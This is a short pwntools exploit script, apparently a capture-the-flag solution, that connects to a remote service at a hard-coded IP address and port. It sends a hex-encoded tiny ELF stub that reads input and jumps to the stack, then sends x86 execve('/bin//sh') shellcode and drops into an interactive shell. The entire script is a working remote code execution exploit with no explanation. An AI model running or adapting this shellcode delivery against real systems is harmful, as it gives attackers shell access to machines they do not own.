from pwn import *

r = remote("195.201.117.89",34588)
r.recv()
pay = "7F 45 4C 46 01 00 00 00 00 00 00 00 00 00 01 00 02 00 03 00 20 00 01 00 20 00 01 00 04 00 00 00 B0 03 89 E1 4A CD 80 FF E4 00 20 00 01"
pay = pay.split()
pay = "".join(pay)
r.sendline(pay)
sleep(1)
s = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
r.sendline(s)
r.interactive()
